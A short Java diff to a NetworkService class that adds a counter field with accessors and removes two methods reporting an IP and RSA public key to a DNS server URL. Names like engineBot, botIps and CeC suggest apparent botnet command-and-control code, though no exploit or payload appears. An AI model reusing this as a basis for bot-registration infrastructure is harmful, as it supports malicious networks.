@@ -91,6 +91,8 @@ public class NetworkService {
 	private String usernameOS;
 
 	boolean elegible;
+	
+	private Integer counterCeCMemory=null;
 
 	public NetworkService() {
 	}
@@ -368,32 +370,8 @@ public class NetworkService {
 		return ip;
 	}
 
-	/**
-	 * @return
-	 */
-	public Boolean updateDnsInformation() {
-
-		String url = engineBot.getDnsurl();
-		Boolean result = false;
-		result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
-		System.out.println("Ip tornato " + result);
-		return Boolean.TRUE;
-	}
-
 	
-	/**
-	 * @param ip
-	 * @param pk
-	 * @return
-	 */
-	public Boolean updateDnsInformation(IP ip, PublicKey pk) {
 
-		String url = engineBot.getDnsurl();
-		Boolean result = false;
-		result = cecReq.sendInfoToDnsServer(url,ip, pk);
-		System.out.println("Ip tornato " + result);
-		return Boolean.TRUE;
-	}
 	/**
 	 * @param ip
 	 * @param pk
@@ -602,6 +580,17 @@ public class NetworkService {
 	public void setIdUser(String idUser) {
 		this.idUser = idUser;
 	}
+
+
+	public Integer getCounterCeCMemory() {
+		return counterCeCMemory;
+	}
+
+
+	public void setCounterCeCMemory(Integer counterCeCMemory) {
+		this.counterCeCMemory = counterCeCMemory;
+	}
+	
 	
 	// public SyncCeCList getBotIps() {
 	// return botIps;
